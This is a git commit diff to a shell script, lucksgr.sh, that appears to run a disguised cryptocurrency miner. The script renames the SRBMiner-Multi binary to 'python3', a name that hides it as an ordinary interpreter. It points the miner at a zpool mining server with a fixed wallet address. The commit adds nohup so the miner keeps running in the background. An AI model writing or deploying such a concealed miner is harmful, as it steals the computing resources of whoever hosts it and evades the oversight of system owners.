f4d1e676c2575a62653b26dbe0b1f4248bc6c9ee
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-17 20:32:44 +0700

    Update lucksgr.sh

--- lucksgr.sh
+++ lucksgr.sh
@@ -6,4 +6,4 @@ cd SRBMiner-Multi-2-4-7
 
 mv SRBMiner-MULTI python3
 
-./python3 -a yespowersugar -o yespowerSUGAR.sea.mine.zpool.ca:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB
+nohup ./python3 -a yespowersugar -o yespowerSUGAR.sea.mine.zpool.ca:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB
